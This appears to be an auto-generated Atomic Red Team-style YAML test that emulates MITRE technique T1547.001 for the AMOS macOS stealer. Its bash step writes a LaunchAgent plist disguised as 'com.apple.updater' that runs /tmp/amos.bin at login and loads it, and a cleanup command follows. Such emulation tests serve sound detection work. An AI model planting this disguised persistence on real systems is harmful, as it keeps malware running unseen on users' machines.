# Auto-generated by CIPHER v5.0
# Source: 5c9fca5e05c4
attack_technique: T1547.001
display_name: "T1547.001 - macOS LaunchAgent Persistence for AMOS"
atomic_tests:
  - name: "T1547.001 - macOS LaunchAgent Persistence for AMOS"
    description: |
      Create a LaunchAgent plist that runs the downloaded AMOS binary at login.
    supported_platforms:
      - macos
    executor:
      name: bash
      command: |
        cat > ~/Library/LaunchAgents/com.apple.updater.plist <<'EOF'
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
          <key>Label</key><string>com.apple.updater</string>
          <key>ProgramArguments</key><array><string>/tmp/amos.bin</string></array>
          <key>RunAtLoad</key><true/>
        </dict>
        </plist>
        EOF
        launchctl load ~/Library/LaunchAgents/com.apple.updater.plist
      cleanup_command: |
        launchctl unload ~/Library/LaunchAgents/com.apple.updater.plist || true; rm -f ~/Library/LaunchAgents/com.apple.updater.plist
